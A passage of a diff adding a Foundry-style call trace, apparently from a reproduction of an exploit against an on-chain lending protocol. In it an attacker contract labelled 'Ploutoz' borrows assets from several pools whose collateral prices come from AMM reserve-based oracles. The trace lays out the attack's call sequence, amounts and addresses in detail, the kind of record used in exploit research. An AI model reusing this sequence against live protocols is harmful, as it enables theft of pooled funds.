+    │   │   │   │   │   ├─ [52301] 0x7A9634F6917b9736832f50f4C19b3A231B36F79b::updateUserWithdrawFee(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18000000000000000000000 [1.8e22])
+    │   │   │   │   │   │   ├─ [46970] 0x9AA48b6e2a063D5F4aB1C7C9dFAaE1bB2212176e::e9252d46(00000000000000000000000000000000000000000000000000000000000000c90000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000003cfc82e37e9a7400000) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ emit Transfer(from: 0xD90EFadeA37a6dB7f6EAC73cC9627Ca87aC7F705, to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 18000000000000000000000 [1.8e22])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [17390] 0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5::transfer(0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 4008679347594905139 [4.008e18])
+    │   │   │   │   │   ├─ [8801] 0x7A9634F6917b9736832f50f4C19b3A231B36F79b::updateUserWithdrawFee(0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 4008679347594905139 [4.008e18])
+    │   │   │   │   │   │   ├─ [7970] 0x9AA48b6e2a063D5F4aB1C7C9dFAaE1bB2212176e::e9252d46(00000000000000000000000000000000000000000000000000000000000000c9000000000000000000000000ad2d8f920a3795c1eee47a00c1056c801eaad18c00000000000000000000000000000000000000000000000037a1b0a0b3d6c633) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ emit Transfer(from: 0xD90EFadeA37a6dB7f6EAC73cC9627Ca87aC7F705, to: 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, value: 4008679347594905139 [4.008e18])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [10855] 0x844FA82f1E54824655470970F7004Dd90546bB28::transferFrom(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 500000000000000000000 [5e20])
+    │   │   │   │   │   ├─ emit Transfer(from: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, value: 500000000000000000000 [5e20])
+    │   │   │   │   │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xD90EFadeA37a6dB7f6EAC73cC9627Ca87aC7F705, value: 115792089237316195423570985008687907853269984665640564038957584007913129639935 [1.157e77])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [579181] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::borrowOrTradeFromPool(0x1da850d42df6b5341cf9b4b2f517554468f4e23499c492dcc5ee6382753e4ef2, 0x0000000000000000000000000000000000000000000000000000000000000000, true, 50000000000000000000 [5e19], [0xD90EFadeA37a6dB7f6EAC73cC9627Ca87aC7F705, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x0000000000000000000000000000000000000000], [97522812031336897733 [9.752e19], 18004008679347594905139 [1.8e22], 4008679347594905139 [4.008e18], 4008679347594905139 [4.008e18], 500000000000000000000 [5e20]], 0x)
+    │   │   │   │   │   ├─ [578247] 0x067D0A19e92a65CAa2Fcd8F3c88DA8851fCd3771::borrowOrTradeFromPool(0x1da850d42df6b5341cf9b4b2f517554468f4e23499c492dcc5ee6382753e4ef2, 0x0000000000000000000000000000000000000000000000000000000000000000, true, 50000000000000000000 [5e19], [0xD90EFadeA37a6dB7f6EAC73cC9627Ca87aC7F705, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x0000000000000000000000000000000000000000], [97522812031336897733 [9.752e19], 18004008679347594905139 [1.8e22], 4008679347594905139 [4.008e18], 4008679347594905139 [4.008e18], 500000000000000000000 [5e20]], 0x) [delegatecall]
+    │   │   │   │   │   │   ├─ [26431] 0x86043747dae9b6dd80C463A29e5B21e50BeF5e7d::queryRate(0x844FA82f1E54824655470970F7004Dd90546bB28, 0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2044] 0xA41BF81be90fe9666CD566A80c85871f41529aed::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 73007656583258593795 [7.3e19]
+    │   │   │   │   │   │   │   ├─ [10534] 0x7246a76cE3413C73ee66584CacE249c23d3C929D::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2504] 0xb8D8C2B574ecdC1dE8B48510e6Cd918115a1c1d7::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 642962604837324215886 [6.429e20], 661980698467057188000 [6.619e20], 1637500354 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 971270924252364151 [9.712e17]
+    │   │   │   │   │   │   │   ├─ [381] 0x844FA82f1E54824655470970F7004Dd90546bB28::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [2359] 0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000004132752ae2efdf6e50000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   │   │   │   ├─  emit topic 0: 0xfb6c38ae4fdd498b3a5003f02ca4ca5340dfedb36b1b100c679eb60633b2c0a7
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000844fa82f1e54824655470970f7004dd90546bb28
+    │   │   │   │   │   │   │        topic 3: 0xd6133f3375157c427f60779422626835068e825d46d98d5a2ab764690544d41c
+    │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000063eb89da4ed0000
+    │   │   │   │   │   │   ├─ [12799] 0x86043747dae9b6dd80C463A29e5B21e50BeF5e7d::queryReturn(0x844FA82f1E54824655470970F7004Dd90546bB28, 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 225000000000000000 [2.25e17]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2044] 0xA41BF81be90fe9666CD566A80c85871f41529aed::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 73007656583258593795 [7.3e19]
+    │   │   │   │   │   │   │   ├─ [381] 0x844FA82f1E54824655470970F7004Dd90546bB28::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [2704] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Revert] revert: target not active
+    │   │   │   │   │   │   │   └─ ← [Revert] revert: target not active
+    │   │   │   │   │   │   ├─ [10870] 0x86043747dae9b6dd80C463A29e5B21e50BeF5e7d::getCurrentMargin(0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5, 0x844FA82f1E54824655470970F7004Dd90546bB28, 18004008679347594905139 [1.8e22], 499550000000000000000 [4.995e20]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2044] 0xA41BF81be90fe9666CD566A80c85871f41529aed::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 73007656583258593795 [7.3e19]
+    │   │   │   │   │   │   │   ├─ [2034] 0x7246a76cE3413C73ee66584CacE249c23d3C929D::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xb8D8C2B574ecdC1dE8B48510e6Cd918115a1c1d7::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 642962604837324215886 [6.429e20], 661980698467057188000 [6.619e20], 1637500354 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 971270924252364151 [9.712e17]
+    │   │   │   │   │   │   │   ├─ [381] 0x844FA82f1E54824655470970F7004Dd90546bB28::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [359] 0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000005e29e1decd0cb6000000000000000000000000000000000000000000000000004132752ae2efdf6e5
+    │   │   │   │   │   │   ├─  emit topic 0: 0x7bd8cbb7ba34b33004f3deda0fd36c92fc0360acbd97843360037b467a538f90
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000d90efadea37a6db7f6eac73cc9627ca87ac7f705
+    │   │   │   │   │   │   │        topic 3: 0xd6133f3375157c427f60779422626835068e825d46d98d5a2ab764690544d41c
+    │   │   │   │   │   │   │           data: 0x000000000000000000000000ff54da7caf3bc3d34664891fc8f3c9b6dea6c7a5000000000000000000000000844fa82f1e54824655470970f7004dd90546bb280000000000000000000000000000000000000000000003cfffcfe88a5b16c63300000000000000000000000000000000000000000000001b14a61e454a6300000000000000000000000000000000000000000000000000054966a0d83106dcc50000000000000000000000000000000000000000000000000000000000001c1f000000000000000000000000000000000000000000000004132752ae2efdf6e5000000000000000000000000000000000000000000000005e29e1decd0cb6000
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000003cfffcfe88a5b16c63300000000000000000000000000000000000000000000001b14a61e454a630000
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000003cfffcfe88a5b16c63300000000000000000000000000000000000000000000001b14a61e454a630000
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000003cfffcfe88a5b16c63300000000000000000000000000000000000000000000001b14a61e454a630000
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000003cfffcfe88a5b16c63300000000000000000000000000000000000000000000001b14a61e454a630000
+    │   │   ├─ [712020] 0xBfA0eD8a55D0d83eD92a9A96c35D59a54D238872::borrow(0x0000000000000000000000000000000000000000000000000000000000000000, 18000000000000000000 [1.8e19], 7200, 1900000000000000000000 [1.9e21], 0x844FA82f1E54824655470970F7004Dd90546bB28, Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [709232] 0x8e9654f15ee934eDab16350E933577E0F9566d27::borrow(0x0000000000000000000000000000000000000000000000000000000000000000, 18000000000000000000 [1.8e19], 7200, 1900000000000000000000 [1.9e21], 0x844FA82f1E54824655470970F7004Dd90546bB28, Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x) [delegatecall]
+    │   │   │   │   ├─ [11727] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::withdrawAccruedInterest(0x2170Ed0880ac9A755fd29B2688956BD959F933F8)
+    │   │   │   │   │   ├─ [10888] 0x86FBf26921CE39F9064d454002d71e565678b493::withdrawAccruedInterest(0x2170Ed0880ac9A755fd29B2688956BD959F933F8) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   ├─ [3961] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::getTotalPrincipal(0xBfA0eD8a55D0d83eD92a9A96c35D59a54D238872, 0x2170Ed0880ac9A755fd29B2688956BD959F933F8) [staticcall]
+    │   │   │   │   │   ├─ [3112] 0x628035bAc24e451Da14981e9B46cC0FaB86711c2::getTotalPrincipal(0xBfA0eD8a55D0d83eD92a9A96c35D59a54D238872, 0x2170Ed0880ac9A755fd29B2688956BD959F933F8) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000003a2cfb4b03163
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000003a2cfb4b03163
+    │   │   │   │   ├─ [2531] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8::balanceOf(0xBfA0eD8a55D0d83eD92a9A96c35D59a54D238872) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 18168539638785200497 [1.816e19]
+    │   │   │   │   ├─ [1961] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::getTotalPrincipal(0xBfA0eD8a55D0d83eD92a9A96c35D59a54D238872, 0x2170Ed0880ac9A755fd29B2688956BD959F933F8) [staticcall]
+    │   │   │   │   │   ├─ [1112] 0x628035bAc24e451Da14981e9B46cC0FaB86711c2::getTotalPrincipal(0xBfA0eD8a55D0d83eD92a9A96c35D59a54D238872, 0x2170Ed0880ac9A755fd29B2688956BD959F933F8) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000003a2cfb4b03163
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000003a2cfb4b03163
+    │   │   │   │   ├─ [531] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8::balanceOf(0xBfA0eD8a55D0d83eD92a9A96c35D59a54D238872) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 18168539638785200497 [1.816e19]
+    │   │   │   │   ├─ [27971] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8::transfer(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18000000000000000000 [1.8e19])
+    │   │   │   │   │   ├─ emit Transfer(from: 0xBfA0eD8a55D0d83eD92a9A96c35D59a54D238872, to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 18000000000000000000 [1.8e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [8071] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8::transfer(0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 3949206565767597 [3.949e15])
+    │   │   │   │   │   ├─ emit Transfer(from: 0xBfA0eD8a55D0d83eD92a9A96c35D59a54D238872, to: 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, value: 3949206565767597 [3.949e15])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [10855] 0x844FA82f1E54824655470970F7004Dd90546bB28::transferFrom(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 1900000000000000000000 [1.9e21])
+    │   │   │   │   │   ├─ emit Transfer(from: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, value: 1900000000000000000000 [1.9e21])
+    │   │   │   │   │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xBfA0eD8a55D0d83eD92a9A96c35D59a54D238872, value: 115792089237316195423570985008687907853269984665640564037557584007913129639935 [1.157e77])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [580111] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::borrowOrTradeFromPool(0x154f3b3d7f7d47928b876792d257b6aa48f66daeb97e95883ac029ceb5e0c4e4, 0x0000000000000000000000000000000000000000000000000000000000000000, true, 50000000000000000000 [5e19], [0xBfA0eD8a55D0d83eD92a9A96c35D59a54D238872, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x0000000000000000000000000000000000000000], [96076280596003611234 [9.607e19], 18003949206565767597 [1.8e19], 3949206565767597 [3.949e15], 3949206565767597 [3.949e15], 1900000000000000000000 [1.9e21]], 0x)
+    │   │   │   │   │   ├─ [579177] 0x067D0A19e92a65CAa2Fcd8F3c88DA8851fCd3771::borrowOrTradeFromPool(0x154f3b3d7f7d47928b876792d257b6aa48f66daeb97e95883ac029ceb5e0c4e4, 0x0000000000000000000000000000000000000000000000000000000000000000, true, 50000000000000000000 [5e19], [0xBfA0eD8a55D0d83eD92a9A96c35D59a54D238872, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x0000000000000000000000000000000000000000], [96076280596003611234 [9.607e19], 18003949206565767597 [1.8e19], 3949206565767597 [3.949e15], 3949206565767597 [3.949e15], 1900000000000000000000 [1.9e21]], 0x) [delegatecall]
+    │   │   │   │   │   │   ├─ [26896] 0x86043747dae9b6dd80C463A29e5B21e50BeF5e7d::queryRate(0x844FA82f1E54824655470970F7004Dd90546bB28, 0x2170Ed0880ac9A755fd29B2688956BD959F933F8) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2044] 0xA41BF81be90fe9666CD566A80c85871f41529aed::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 73007656583258593795 [7.3e19]
+    │   │   │   │   │   │   │   ├─ [10933] 0x383E0eC758E4faa5C68b52066cf34Dc4Cc047Bc8::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2893] 0x7213a321F1855CF1779f42c0CD85d3D95291D34C::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 112730410706132869514 [1.127e20], 465760816145786721638343 [4.657e23], 1637659429 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 4131634163561580534839 [4.131e21]
+    │   │   │   │   │   │   │   ├─ [381] 0x844FA82f1E54824655470970F7004Dd90546bB28::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [2425] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000003ec72432b8ba6b0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   │   │   │   ├─  emit topic 0: 0xfb6c38ae4fdd498b3a5003f02ca4ca5340dfedb36b1b100c679eb60633b2c0a7
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000844fa82f1e54824655470970f7004dd90546bb28
+    │   │   │   │   │   │   │        topic 3: 0xb2413030f3abd44a81852dbe9418b2bb10263218effd0de33e30f51119c1255b
+    │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000017bb23f0a5eb0000
+    │   │   │   │   │   │   ├─ [12799] 0x86043747dae9b6dd80C463A29e5B21e50BeF5e7d::queryReturn(0x844FA82f1E54824655470970F7004Dd90546bB28, 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 855000000000000000 [8.55e17]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2044] 0xA41BF81be90fe9666CD566A80c85871f41529aed::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 73007656583258593795 [7.3e19]
+    │   │   │   │   │   │   │   ├─ [381] 0x844FA82f1E54824655470970F7004Dd90546bB28::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [2704] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Revert] revert: target not active
+    │   │   │   │   │   │   │   └─ ← [Revert] revert: target not active
+    │   │   │   │   │   │   ├─ [11335] 0x86043747dae9b6dd80C463A29e5B21e50BeF5e7d::getCurrentMargin(0x2170Ed0880ac9A755fd29B2688956BD959F933F8, 0x844FA82f1E54824655470970F7004Dd90546bB28, 18003949206565767597 [1.8e19], 1898290000000000000000 [1.898e21]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2044] 0xA41BF81be90fe9666CD566A80c85871f41529aed::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 73007656583258593795 [7.3e19]
+    │   │   │   │   │   │   │   ├─ [2433] 0x383E0eC758E4faa5C68b52066cf34Dc4Cc047Bc8::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [893] 0x7213a321F1855CF1779f42c0CD85d3D95291D34C::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 112730410706132869514 [1.127e20], 465760816145786721638343 [4.657e23], 1637659429 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 4131634163561580534839 [4.131e21]
+    │   │   │   │   │   │   │   ├─ [381] 0x844FA82f1E54824655470970F7004Dd90546bB28::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [425] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000004add29678aead5320000000000000000000000000000000000000000000000000003ec72432b8ba6b
+    │   │   │   │   │   │   ├─  emit topic 0: 0x7bd8cbb7ba34b33004f3deda0fd36c92fc0360acbd97843360037b467a538f90
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000bfa0ed8a55d0d83ed92a9a96c35d59a54d238872
+    │   │   │   │   │   │   │        topic 3: 0xb2413030f3abd44a81852dbe9418b2bb10263218effd0de33e30f51119c1255b
+    │   │   │   │   │   │   │           data: 0x0000000000000000000000002170ed0880ac9a755fd29b2688956bd959f933f8000000000000000000000000844fa82f1e54824655470970f7004dd90546bb28000000000000000000000000000000000000000000000000f9dae06a138749ad000000000000000000000000000000000000000000000066e810d96db44500000000000000000000000000000000000000000000000000053553842b098ce2620000000000000000000000000000000000000000000000000000000000001c1f000000000000000000000000000000000000000000000000003ec72432b8ba6b000000000000000000000000000000000000000000000004add29678aead5320
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000f9dae06a138749ad000000000000000000000000000000000000000000000066e810d96db4450000
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000f9dae06a138749ad000000000000000000000000000000000000000000000066e810d96db4450000
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000f9dae06a138749ad000000000000000000000000000000000000000000000066e810d96db4450000
+    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000f9dae06a138749ad000000000000000000000000000000000000000000000066e810d96db4450000
+    │   │   ├─ [712020] 0x1EF256E054C838B0C5a544149459C7F719Ff7A8d::borrow(0x0000000000000000000000000000000000000000000000000000000000000000, 1600000000000000000 [1.6e18], 7200, 2000000000000000000000 [2e21], 0x844FA82f1E54824655470970F7004Dd90546bB28, Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [709232] 0x8e9654f15ee934eDab16350E933577E0F9566d27::borrow(0x0000000000000000000000000000000000000000000000000000000000000000, 1600000000000000000 [1.6e18], 7200, 2000000000000000000000 [2e21], 0x844FA82f1E54824655470970F7004Dd90546bB28, Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x) [delegatecall]
+    │   │   │   │   ├─ [11727] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::withdrawAccruedInterest(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c)
+    │   │   │   │   │   ├─ [10888] 0x86FBf26921CE39F9064d454002d71e565678b493::withdrawAccruedInterest(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   ├─ [3961] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::getTotalPrincipal(0x1EF256E054C838B0C5a544149459C7F719Ff7A8d, 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c) [staticcall]
+    │   │   │   │   │   ├─ [3112] 0x628035bAc24e451Da14981e9B46cC0FaB86711c2::getTotalPrincipal(0x1EF256E054C838B0C5a544149459C7F719Ff7A8d, 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000002d39f1798462
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000002d39f1798462
+    │   │   │   │   ├─ [2531] 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c::balanceOf(0x1EF256E054C838B0C5a544149459C7F719Ff7A8d) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1699802896776334641 [1.699e18]
+    │   │   │   │   ├─ [1961] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::getTotalPrincipal(0x1EF256E054C838B0C5a544149459C7F719Ff7A8d, 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c) [staticcall]
+    │   │   │   │   │   ├─ [1112] 0x628035bAc24e451Da14981e9B46cC0FaB86711c2::getTotalPrincipal(0x1EF256E054C838B0C5a544149459C7F719Ff7A8d, 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000002d39f1798462
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000002d39f1798462
+    │   │   │   │   ├─ [531] 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c::balanceOf(0x1EF256E054C838B0C5a544149459C7F719Ff7A8d) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1699802896776334641 [1.699e18]
+    │   │   │   │   ├─ [27971] 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c::transfer(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1600000000000000000 [1.6e18])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x1EF256E054C838B0C5a544149459C7F719Ff7A8d, to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1600000000000000000 [1.6e18])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [8071] 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c::transfer(0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 274620781858497 [2.746e14])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x1EF256E054C838B0C5a544149459C7F719Ff7A8d, to: 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, value: 274620781858497 [2.746e14])
+    │   │   │   │   │   └─ ← [Return] true
